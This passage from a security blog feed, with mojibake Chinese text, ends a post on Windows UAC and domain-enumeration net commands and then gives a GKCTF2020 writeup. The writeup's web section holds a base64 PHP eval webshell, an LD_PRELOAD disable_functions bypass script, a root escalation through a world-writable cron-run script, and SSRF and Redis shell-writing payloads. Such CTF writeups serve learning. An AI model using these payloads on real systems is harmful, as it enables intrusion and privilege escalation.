Controlï¼Œç”¨æˆ·è´¦æˆ·æ§åˆ¶)ï¼Œæœ€ç›´è§‚çš„è¡¨ç°æ˜¯å½“åº”ç”¨è¯•å›¾å®‰è£…è½¯ä»¶æˆ–æ›´æ”¹è®¡ç®—æœºã€æˆ–è€…æ›´æ”¹äº† Windows è®¾ç½®æ—¶å°†å¼¹å‡º UAC æç¤ºæ¡†ã€‚</p><p>ä» Windows Vista å¼€å§‹ï¼Œè¿›ç¨‹åœ¨åˆ›å»ºçš„æ—¶å€™ï¼Œå¯ä»¥å¾—åˆ°ä¸€ä¸ªè®¿é—®ä»¤ç‰Œï¼ˆAccess Tokenï¼‰ï¼Œè¿™ä¸ªä»¤ç‰Œæœ‰å››ä¸ªå®Œæ•´æ€§çº§åˆ«ï¼š</p><ul><li>Systemï¼ˆç³»ç»Ÿï¼‰</li><li>Highï¼ˆé«˜ï¼‰</li><li>Mediumï¼ˆä¸­ï¼‰</li><li>Lowï¼ˆä½ï¼‰</li></ul><p>System ä»¤ç‰Œæ˜¯å¯¹ç³»ç»Ÿå®Œå…¨æ“ä½œçš„ä»¤ç‰Œï¼Œå¯¹åº” SYSTEM ç”¨æˆ·æ‹¥æœ‰çš„æœ€é«˜æƒé™ï¼Œå¯ä»¥å¯¹ Windows æ“ä½œç³»ç»Ÿåšä»»ä½•äº‹ã€‚é€šå¸¸ä¸€ä¸ªæœåŠ¡è¿›ç¨‹ä¼šä»¥ SYSTEM ç”¨æˆ·å¯åŠ¨ï¼Œæ‹¿åˆ° System ä»¤ç‰Œã€‚</p><p>High å¯¹åº” Administrators ç»„æ‹¥æœ‰çš„æœ€é«˜æƒé™ï¼Œä¹Ÿå°±æ˜¯å‰é¢æ‰€è¯´çš„ Administrator ç”¨æˆ·å’Œç”¨æˆ·è‡ªå·±åˆ›å»ºçš„ç®¡ç†å‘˜è´¦æˆ·çš„æƒé™çº§åˆ«ã€‚æ­¤æƒé™çº§åˆ«ç”¨æ¥ç®¡ç†è®¡ç®—æœºï¼Œå¯ä»¥ä¿®æ”¹å…¶ä»–ç”¨æˆ·ï¼Œå¯ä»¥ä¿®æ”¹ç³»ç»Ÿçš„è®¾ç½®ï¼Œè¿™äº›è®¾ç½®å¯èƒ½ä¼šé€ æˆå®‰å…¨é—®é¢˜ï¼ˆæ¯”å¦‚æ›´æ”¹ç³»ç»Ÿæ—¶é—´å¯èƒ½å¯¼è‡´æ€æ¯’è½¯ä»¶å¤±æ•ˆï¼‰ã€‚</p><p>Medium å¯¹åº” Users ç»„æ‹¥æœ‰çš„æœ€é«˜æƒé™ï¼Œä¹Ÿå°±æ˜¯å‰é¢æ‰€è¯´çš„ç”¨æˆ·è‡ªå·±åˆ›å»ºçš„æ ‡å‡†ç”¨æˆ·ã€‚æ­¤æƒé™çº§åˆ«ç”¨æ¥æ—¥å¸¸ä½¿ç”¨ã€‚Medium æƒé™åœ¨ Windows Vistaï¼ˆå®é™…ä¸Šæ˜¯å…¶å†…æ ¸ NT6ï¼‰ä¸­ç›¸æ¯”äºä¹‹å‰ç‰ˆæœ¬çš„ Windows æœ‰ä¸€äº›æƒé™çš„æå‡ï¼Œä¸å±åŠç³»ç»Ÿå®‰å…¨æ€§çš„æ“ä½œåœ¨ Medium ä¸‹å³å¯ä»¥å®Œæˆï¼Œä¸éœ€è¦åˆ‡æ¢åˆ° High çº§åˆ«ã€‚Users ç»„çš„ç”¨æˆ·æ˜¯æ²¡æœ‰ High å’Œ System ä»¤ç‰Œçš„ï¼Œç¨‹åºåœ¨æ­¤ç”¨æˆ·è´¦æˆ·ä¸‹ï¼Œæ— è®ºå¦‚ä½•ä¹Ÿæ— æ³•æ‹¿åˆ° High å’Œ System ä»¤ç‰Œçš„ï¼Œå› ä¸ºè¿™ä¸ªç”¨æˆ·æ²¡æœ‰è¿™æ ·çš„ä»¤ç‰Œï¼›å¦‚æœè¦æƒé™æå‡ï¼Œéœ€è¦è¾“å…¥ç®¡ç†å‘˜è´¦å·å¯†ç ï¼Œè€Œè¿™æ—¶æ‹¿åˆ°çš„æ˜¯è¿™ä¸ªç®¡ç†å‘˜è´¦å·çš„ High å’Œ System ä»¤ç‰Œã€‚</p><p>Low å¹¶ä¸å¯¹åº”è€…ä¸€ä¸ªç”¨æˆ·ç»„ï¼Œè¿™æ˜¯ä¸ºäº†ä¸€äº›éœ€è¦ç‰¹æ®Šä¿æŠ¤çš„åº”ç”¨ç¨‹åºå‡†å¤‡çš„ã€‚æœ‰äº›åº”ç”¨å®¹æ˜“å—åˆ°æ”»å‡»ï¼Œé‚£ä¹ˆä½¿ç”¨ Low ä»¤ç‰Œå¯åŠ¨è¿™äº›åº”ç”¨ç¨‹åºï¼Œå¯ä»¥æœ€å¤§ç¨‹åº¦å‡å°‘åˆ©ç”¨è¿™äº›åº”ç”¨å¯¹ç³»ç»Ÿé€ æˆæ”»å‡»ã€‚æ¯”å¦‚ IE æµè§ˆå™¨çš„é¡µé¢è¿›ç¨‹ä½¿ç”¨ Low ä»¤ç‰Œè¿è¡Œï¼Œå…¶å¯¹ç³»ç»Ÿå¾ˆéš¾åšå‡ºä»€ä¹ˆæ”¹åŠ¨ï¼Œç”šè‡³ä¹Ÿå½±å“ä¸äº†å½“å‰ç”¨æˆ·çš„æ–‡ä»¶ï¼›å½“éœ€è¦éœ€ç³»ç»Ÿè®¡ç®—æœºè¿›è¡Œäº¤äº’çš„æ—¶å€™ï¼Œä¼šä¸ IE çš„ UI è¿›ç¨‹ï¼ˆMedium ä»¤ç‰Œï¼‰è¿›è¡Œé€šä¿¡ï¼Œè¯·æ±‚ååŠ©å®Œæˆã€‚</p><p>å½“ UAC æ˜¯å¼€å¯çŠ¶æ€ï¼Œæ— è®ºæ˜¯ç®¡ç†å‘˜è´¦æˆ·è¿˜æ˜¯æ ‡å‡†è´¦æˆ·ï¼ŒWindows èµ„æºç®¡ç†å™¨è¿›ç¨‹ï¼ˆexplorer.exeï¼‰éƒ½æ˜¯ä»¥ Medium ä»¤ç‰Œå¯åŠ¨è¿›ç¨‹ã€‚ç”±äºå­è¿›ç¨‹é€šå¸¸èƒ½å¤Ÿç»§æ‰¿çˆ¶è¿›ç¨‹çš„ä»¤ç‰Œå®Œæ•´æ€§çº§åˆ«ï¼Œæ‰€ä»¥è¿™æ ·çš„è®¾å®šå¯ä»¥é˜²æ­¢ç”¨æˆ·åŒå‡»æ‰“å¼€çš„ç¨‹åºå¾—åˆ°è¿‡é«˜çš„ä»¤ç‰Œï¼Œä»è€Œåœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹å±åŠç³»ç»Ÿå®‰å…¨ã€‚</p><h3 id="ASR"><a href="#ASR" class="headerlink" title="ASR"></a>ASR</h3><h3 id="Applocker"><a href="#Applocker" class="headerlink" title="Applocker"></a>Applocker</h3><h2 id="åŸŸå’Œå·¥ä½œç»„"><a href="#åŸŸå’Œå·¥ä½œç»„" class="headerlink" title="åŸŸå’Œå·¥ä½œç»„"></a>åŸŸå’Œå·¥ä½œç»„</h2><h3 id="å·¥ä½œç»„"><a href="#å·¥ä½œç»„" class="headerlink" title="å·¥ä½œç»„"></a>å·¥ä½œç»„</h3><p>æ‰€æœ‰çš„è®¡ç®—æœºéƒ½æ˜¯å¯¹ç­‰çš„ï¼Œæ²¡æœ‰è®¡ç®—æœºå¯ä»¥æ§åˆ¶å¦ä¸€å°è®¡ç®—æœºã€‚</p><p>æ¯å°è®¡ç®—æœºéƒ½å…·æœ‰ä¸€ç»„ç”¨æˆ·å¸æˆ·ã€‚è‹¥è¦ç™»å½•åˆ°å·¥ä½œç»„ä¸­çš„ä»»ä½•è®¡ç®—æœºï¼Œæ‚¨å¿…é¡»å…·æœ‰è¯¥è®¡ç®—æœºä¸Šçš„å¸æˆ·ã€‚</p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œè®¡ç®—æœºçš„æ•°é‡ä¸è¶…è¿‡äºŒåå°ã€‚å·¥ä½œç»„ä¸å—å¯†ç ä¿æŠ¤ã€‚æ‰€æœ‰çš„è®¡ç®—æœºå¿…é¡»åœ¨åŒä¸€æœ¬åœ°ç½‘ç»œæˆ–å­ç½‘ä¸­ã€‚</p><h3 id="åŸŸ"><a href="#åŸŸ" class="headerlink" title="åŸŸ"></a>åŸŸ</h3><p>æœ‰ä¸€å°æˆ–å¤šå°è®¡ç®—æœºä¸ºæœåŠ¡å™¨ã€‚ç½‘ç»œç®¡ç†å‘˜ä½¿ç”¨æœåŠ¡å™¨æ§åˆ¶åŸŸä¸­æ‰€æœ‰è®¡ç®—æœºçš„å®‰å…¨å’Œæƒé™ã€‚è¿™ä½¿å¾—æ›´å®¹æ˜“è¿›è¡Œæ›´æ”¹ï¼Œå› ä¸ºæ›´æ”¹ä¼šè‡ªåŠ¨åº”ç”¨åˆ°æ‰€æœ‰çš„è®¡ç®—æœºã€‚åŸŸç”¨æˆ·åœ¨æ¯æ¬¡è®¿é—®åŸŸæ—¶å¿…é¡»æä¾›å¯†ç æˆ–å…¶ä»–å‡­æ®ã€‚</p><p>å¦‚æœå…·æœ‰åŸŸä¸Šçš„ç”¨æˆ·å¸æˆ·ï¼Œæ‚¨å°±å¯ä»¥ç™»å½•åˆ°åŸŸä¸­çš„ä»»ä½•è®¡ç®—æœºï¼Œè€Œæ— éœ€å…·æœ‰è¯¥è®¡ç®—æœºä¸Šçš„å¸æˆ·ã€‚</p><p>ç”±äºç½‘ç»œç®¡ç†å‘˜ç»å¸¸è¦ç¡®ä¿è®¡ç®—æœºä¹‹é—´çš„ä¸€è‡´æ€§ï¼Œæ‰€ä»¥ï¼Œåªèƒ½å¯¹è®¡ç®—æœºçš„è®¾ç½®è¿›è¡Œæœ‰é™åˆ¶åœ°æ›´æ”¹ã€‚</p><p>ä¸€ä¸ªåŸŸä¸­å¯ä»¥æœ‰å‡ åƒå°è®¡ç®—æœºã€‚è®¡ç®—æœºå¯ä»¥ä½äºä¸åŒçš„æœ¬åœ°ç½‘ç»œä¸­ã€‚</p><p>åŸŸæ˜¯ç”±åŸŸæ§åˆ¶å™¨(Domain Controller)å’Œæˆå‘˜è®¡ç®—æœºç»„æˆï¼ŒåŸŸæ§åˆ¶å™¨å°±æ˜¯å®‰è£…äº†æ´»åŠ¨ ç›®å½•(Active Directory)çš„è®¡ç®—æœºã€‚æ´»åŠ¨ç›®å½•æä¾›äº†å­˜å‚¨ç½‘ç»œä¸Šå¯¹è±¡ä¿¡æ¯å¹¶ä½¿ç”¨ç½‘ç»œä½¿ç”¨è¯¥æ•°æ®çš„æ–¹æ³•ã€‚</p><h4 id="å†…ç½‘å¸¸ç”¨å‘½ä»¤"><a href="#å†…ç½‘å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å†…ç½‘å¸¸ç”¨å‘½ä»¤"></a>å†…ç½‘å¸¸ç”¨å‘½ä»¤</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">å°†Windows Server Core åŠ å…¥åˆ°åŸŸ</span></span><br><span class="line">netdom renamecomputer FileServer /newname:ProfileServer #æ›´æ”¹è®¡ç®—æœºåç§°ä¸ºProfileServer</span><br><span class="line">netsh interface ipv4 set address name=&quot;æœ¬åœ°è¿æ¥&quot; source=static addr=192.168.10.212 mask= 255.255.255.0 gateway=192.168.10.1</span><br><span class="line">netsh interface ipv4 set dnsserver &quot;æœ¬åœ°è¿æ¥&quot; static 192.168.10.200 primary</span><br><span class="line">netdom join %computername% /domain:http://ESS.COM /userd:administrator /passwordD:a1! /REBoot:5</span><br><span class="line"></span><br><span class="line">net user ------&gt; æœ¬æœºç”¨æˆ·åˆ—è¡¨</span><br><span class="line">net localhroup administrators ------&gt; æœ¬æœºç®¡ç†å‘˜[é€šå¸¸å«æœ‰åŸŸç”¨æˆ·]</span><br><span class="line">net user /domain ------&gt; æŸ¥è¯¢åŸŸç”¨æˆ·</span><br><span class="line">net group /domain ------&gt; æŸ¥è¯¢åŸŸé‡Œé¢çš„å·¥ä½œç»„</span><br><span class="line">net group &quot;domain admins&quot; /domain ------&gt; æŸ¥è¯¢åŸŸç®¡ç†å‘˜ç”¨æˆ·ç»„</span><br><span class="line">net localgroup administrators /domain ------&gt; ç™»å½•æœ¬æœºçš„åŸŸç®¡ç†å‘˜</span><br><span class="line">net localgroup administrators workgroup\user001 /add -----&gt;åŸŸç”¨æˆ·æ·»åŠ åˆ°æœ¬æœº</span><br><span class="line">net group &quot;Domain controllers&quot; -------&gt; æŸ¥çœ‹åŸŸæ§åˆ¶å™¨(å¦‚æœæœ‰å¤šå°)</span><br><span class="line">ipconfig /all ------&gt; æŸ¥è¯¢æœ¬æœºIPæ®µï¼Œæ‰€åœ¨åŸŸç­‰</span><br><span class="line">net view ------&gt; æŸ¥è¯¢åŒä¸€åŸŸå†…æœºå™¨åˆ—è¡¨</span><br><span class="line">net view /domain ------&gt; æŸ¥è¯¢åŸŸåˆ—è¡¨</span><br><span class="line">net view /domain:domainname -----&gt; æŸ¥çœ‹workgroupåŸŸä¸­è®¡ç®—æœºåˆ—è¡¨</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><p><a href="https://www.cnblogs.com/lip-blog/p/7658839.html">https://www.cnblogs.com/lip-blog/p/7658839.html</a></p><p><a href="https://blog.csdn.net/WPwalter/article/details/89838881">https://blog.csdn.net/WPwalter/article/details/89838881</a></p><p><a href="https://zhuanlan.zhihu.com/p/32287774">https://zhuanlan.zhihu.com/p/32287774</a></p><p><a href="https://www.cnblogs.com/mq0036/p/3518542.html">https://www.cnblogs.com/mq0036/p/3518542.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF2020 writeup</title>
      <link href="2020/05/24/GKCTF2020-writeup/"/>
      <url>2020/05/24/GKCTF2020-writeup/</url>
      
        <content type="html"><![CDATA[<p>ç”±é˜²ç¾ç§‘æŠ€å­¦é™¢&amp;Bugforä¸¾åŠçš„æ¯”èµ›ï¼Œè®°ä¸€ä¸‹ï¼</p><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="CheckIN"><a href="#CheckIN" class="headerlink" title="CheckIN"></a>CheckIN</h3><p>base64åŠ å¯†ä¸€ä¸‹ï¼Œå…ˆå¾€/tmpä¸‹å†™ä¸ªé©¬ï¼Œç„¶ååŒ…å«è¿™ä¸ªé©¬ï¼Œèšå‰‘è¿ä¸ŠLD_PRELOAD bypass disable_function</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(<span class="string">&quot;/tmp/1.php&quot;</span>, base64_decode(<span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs=&quot;</span>));</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;/tmp/moonback&#x27;</span>);</span><br></pre></td></tr></table></figure><p>è´´ä¸€ä¸‹php exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;</span>;</span><br><span class="line">    $cmd = $_GET[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">    $out_path = $_GET[<span class="string">&quot;outpath&quot;</span>];</span><br><span class="line">    $evil_cmdline = $cmd . <span class="string">&quot; &gt; &quot;</span> . $out_path . <span class="string">&quot; 2&gt;&amp;1&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot;</span> . $evil_cmdline . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    putenv(<span class="string">&quot;EVIL_CMDLINE=&quot;</span> . $evil_cmdline);</span><br><span class="line">    $so_path = $_GET[<span class="string">&quot;sopath&quot;</span>];</span><br><span class="line">    putenv(<span class="string">&quot;LD_PRELOAD=&quot;</span> . $so_path);</span><br><span class="line">    mail(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot;</span> . nl2br(file_get_contents($out_path)) . <span class="string">&quot;&lt;/p&gt;&quot;</span>; </span><br><span class="line">    unlink($out_path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="è€å…«å°è¶…å¸‚å„¿"><a href="#è€å…«å°è¶…å¸‚å„¿" class="headerlink" title="è€å…«å°è¶…å¸‚å„¿"></a>è€å…«å°è¶…å¸‚å„¿</h3><p>é»˜è®¤å¯†ç ï¼Œadmin shopxoï¼Œåå°ä¸Šä¼ ä¸»é¢˜getshell</p><p>èšå‰‘è¿ä¸Šå‘ç°flagæ˜¯å‡çš„ï¼Œhintæç¤ºGET root,è¯•äº†å¥½å¤šåŠæ³•éƒ½ä¸è¡Œ</p><p>åæ¥å‘ç°æœ‰auto.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> (python /var/mail/makeflaghint.py &amp;) &amp;&amp; sleep 60; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>çœ‹äº†ä¸‹è¿›ç¨‹æ˜¯ä»¥rootè¿è¡Œçš„ï¼Œå¹¶ä¸”æ‰€æœ‰è€…æ˜¯root</p><p>makeflaghint.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">os.system(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line">gk1=str(time.ctime())</span><br><span class="line">gk=<span class="string">&quot;\nGet The RooT,The Date Is Useful!&quot;</span></span><br><span class="line">f=io.open(<span class="string">&quot;/flag.hint&quot;</span>, <span class="string">&quot;rb+&quot;</span>)</span><br><span class="line">f.write(str(gk1))</span><br><span class="line">f.write(str(gk))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ–‡ä»¶å°±å¾ˆç‰¹æ®Šäº†</p><img src="/2020/05/24/GKCTF2020-writeup/TIMæˆªå›¾20200524154415.png" style="zoom:80%;"><p>æ‰€æœ‰ç”¨æˆ·å¯¹å®ƒéƒ½å¯å†™ï¼Œå› ä¸ºä¸Šé¢auto.shæ˜¯ä»¥rootè¿è¡Œçš„ï¼Œå¹¶ä¸”é‡Œé¢è°ƒç”¨äº†makeflaghint.pyï¼Œç›¸å½“äºrootè¿è¡Œmakeflaghint.pyï¼Œæˆ‘ä»¬å°±å¯ä»¥æ”¹ä¸‹å†…å®¹ï¼Œå¢åŠ ä¸€è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">&#x27;cat /root/flag &gt; a&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å°±èƒ½getflagäº†ï¼ŒçœŸæ²¡æƒ³åˆ°ï¼ï¼ï¼</p><h3 id="cveç‰ˆç­¾åˆ°"><a href="#cveç‰ˆç­¾åˆ°" class="headerlink" title="cveç‰ˆç­¾åˆ°"></a>cveç‰ˆç­¾åˆ°</h3><p>hintè¯´<code>cve-2020-7066</code>ï¼Œçœ‹ä¸€ä¸‹ä»‹ç»ï¼š</p><p><img src="/2020/05/24/GKCTF2020-writeup/TIM%E6%88%AA%E5%9B%BE20200524160449.png"></p><p>ç„¶ååˆåœ¨é¢˜ç›®å“åº”å¤´é‡Œçœ‹åˆ°</p><img src="/2020/05/24/GKCTF2020-writeup/TIMæˆªå›¾20200524160555.png" style="zoom:80%;"><p>ç„¶åæ„é€ flagå°±å‡ºæ¥äº†ï¼Œæ²¡ææ‡‚23333</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;127.0.0.123%00.ctfhub.com</span><br></pre></td></tr></table></figure><h3 id="EZä¸‰å‰‘å®¢-EzWeb"><a href="#EZä¸‰å‰‘å®¢-EzWeb" class="headerlink" title="EZä¸‰å‰‘å®¢-EzWeb"></a>EZä¸‰å‰‘å®¢-EzWeb</h3><p>æŸ¥çœ‹æºç ï¼Œå‘ç°<code>?secret</code>ï¼Œè®¿é—®å‘ç°ç»™å‡ºäº†é¶æœºip</p><p>ç›´æ¥ç”¨æœ¬æœºipè¯•å‘ç°</p><img src="/2020/05/24/GKCTF2020-writeup/TIMæˆªå›¾20200526094434.png" style="zoom:50%;"><p>bp fuzzä¸€ä¸‹ï¼š</p><img src="/2020/05/24/GKCTF2020-writeup/TIMæˆªå›¾20200526100323.png" style="zoom: 80%;"><p>åœ¨<code>173.167.10.11</code>çœ‹åˆ°</p><img src="/2020/05/24/GKCTF2020-writeup/TIMæˆªå›¾20200526100709.png" style="zoom:80%;"><p>æç¤ºè¦æµ‹è¯•ç«¯å£ï¼Œè¯•ä¸‹</p><p><img src="/2020/05/24/GKCTF2020-writeup/TIM%E6%88%AA%E5%9B%BE20200526101028.png"></p><p>redisæœªæˆæƒè®¿é—®ï¼Œå†™shellï¼Œç›´æ¥ç”¨Gopherusç”Ÿæˆpayload</p><img src="/2020/05/24/GKCTF2020-writeup/TIMæˆªå›¾20200526102304.png" style="zoom:80%;"><p>æ³¨æ„è¦urläºŒæ¬¡ç¼–ç </p><img src="/2020/05/24/GKCTF2020-writeup/TIMæˆªå›¾20200526102428.png" style="zoom:67%;"><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="å°å­¦ç”Ÿçš„å¯†ç å­¦"><a href="#å°å­¦ç”Ÿçš„å¯†ç å­¦" class="headerlink" title="å°å­¦ç”Ÿçš„å¯†ç å­¦"></a>å°å­¦ç”Ÿçš„å¯†ç å­¦</h3><p>ä»¿å°„å¯†ç ï¼Œç›´æ¥åœ¨çº¿ç½‘ç«™è§£ï¼š</p><p><a href="https://aliyunvi.com/affine">https://aliyunvi.com/affine</a></p><p>åŠ å¯†å½¢å¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e(x)&#x3D;ax+b (mod 26)</span><br></pre></td></tr></table></figure><h3 id="æ±‰å­—çš„ç§˜å¯†"><a href="#æ±‰å­—çš„ç§˜å¯†" class="headerlink" title="æ±‰å­—çš„ç§˜å¯†"></a>æ±‰å­—çš„ç§˜å¯†</h3><p>å½“é“ºå¯†ç </p><img src="/2020/05/24/GKCTF2020-writeup/TIMæˆªå›¾20200524161626.png" style="zoom:80%;"><p>åŸæ–‡ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç‹å£® å¤«å·¥ ç‹ä¸­ ç‹å¤« ç”±ç”±äº• äº•äºº å¤«ä¸­ å¤«å¤« äº•ç‹ åœŸåœŸ å¤«ç”±</span><br><span class="line">åœŸå¤« äº•ä¸­ å£«å¤« ç‹å·¥ ç‹äºº åœŸç”± ç”±å£å¤«</span><br></pre></td></tr></table></figure><p>æ›¿æ¢å:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">69 74 62 67 118 83 72 77 86 55 71</span><br><span class="line">57 82 57 64 63 51 107</span><br></pre></td></tr></table></figure><p>æ¥ç€è½¬asciiå¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EJ&gt;CvSHMV7G</span><br><span class="line">9R9@?3k</span><br></pre></td></tr></table></figure><p>åº”è¯¥æƒ³åˆ°çš„,tclï¼ŒEå’ŒFå·®1ï¼ŒJå’ŒLå·®2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;EJ&gt;CvSHMV7G9R9@?3k&#x27;</span></span><br><span class="line">j=<span class="number">1</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">flag=flag+chr(ord(i)+j)</span><br><span class="line">j=j+<span class="number">1</span></span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment"># flag&#123;you_are_good&#125;</span></span><br></pre></td></tr></table></figure><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="PokeÌmon"><a href="#PokeÌmon" class="headerlink" title="PokeÌmon"></a>PokeÌmon</h3><p>çœŸå°±ç©æ¸¸æˆå°±ç»™flagï¼Œç”¨VisualBoyAdvanceæ‰“å¼€ç©å°±å®Œäº‹äº†</p><img src="/2020/05/24/GKCTF2020-writeup/TIMæˆªå›¾20200525185522.png" style="zoom:80%;"><p>flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;PokEmon_14_CutE&#125;</span><br></pre></td></tr></table></figure><h3 id="Harley-Quinn"><a href="#Harley-Quinn" class="headerlink" title="Harley Quinn"></a>Harley Quinn</h3><p>å‹ç¼©åŒ…æè¿°é‡Œæœ‰æç¤º,æœäº†ä¸‹ï¼Œå‘ç°æ˜¯ï»¿FreeFileCamouflageä¸€ç§éšå†™æ–¹å¼ï¼Œå¯å°†æ–‡ä»¶éšå†™åœ¨JPGå›¾ç‰‡ä¸­</p><img src="/2020/05/24/GKCTF2020-writeup/TIMæˆªå›¾20200525190609.png" style="zoom:80%;"><p>è§£å‹åœ¨Heathens.wavå±æ€§é‡Œçœ‹åˆ°hint</p><img src="/2020/05/24/GKCTF2020-writeup/TIMæˆªå›¾20200525190821.png" style="zoom:80%;"><p>æœ€åä¸€æ®µæ˜¯æ‹¨å·éŸ³ï¼Œå¯¹ç…§é¢‘è°±</p><p><strong>DTMFå¯¹ç…§è¡¨</strong></p><table><thead><tr><th>ä½é¢‘ \ é«˜é¢‘(Hz)</th><th>1209</th><th>1336</th><th>1477</th><th>1633</th></tr></thead><tbody><tr><td>697</td><td>1</td><td>2</td><td>3</td><td>A</td></tr><tr><td>770</td><td>4</td><td>5</td><td>6</td><td>B</td></tr><tr><td>852</td><td>7</td><td>8</td><td>9</td><td>C</td></tr><tr><td>941</td><td>*</td><td>0</td><td>#</td><td>D</td></tr></tbody></table><p>æˆ–è€…ç›´æ¥ä½¿ç”¨<code>dtmf2num.exe</code></p><img src="/2020/05/24/GKCTF2020-writeup/TIMæˆªå›¾20200525192817.png" style="zoom: 80%;"><p>å¾—å‡ºæ‹¨å·éŸ³ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#222833344477773338866#</span><br></pre></td></tr></table></figure><img src="/2020/05/24/GKCTF2020-writeup/u=2226515071,1685276597&amp;fm=26&amp;gp=0.jpg" style="zoom:80%;"><p>ä¸‰ä¸ª2ä»£è¡¨2çš„ç¬¬ä¸‰ä¸ªå­—æ¯å³cï¼Œä»¥æ­¤ç±»æ¨å¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfisfun</span><br></pre></td></tr></table></figure><p>ç„¶åè§£å¯†å°±è¡Œ</p><p><img src="/2020/05/24/GKCTF2020-writeup/TIM%E6%88%AA%E5%9B%BE20200525205317.png"></p><p>ä¼šå¾—åˆ°flag.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Pudd1n!!_y0u_F1nd_m3!&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
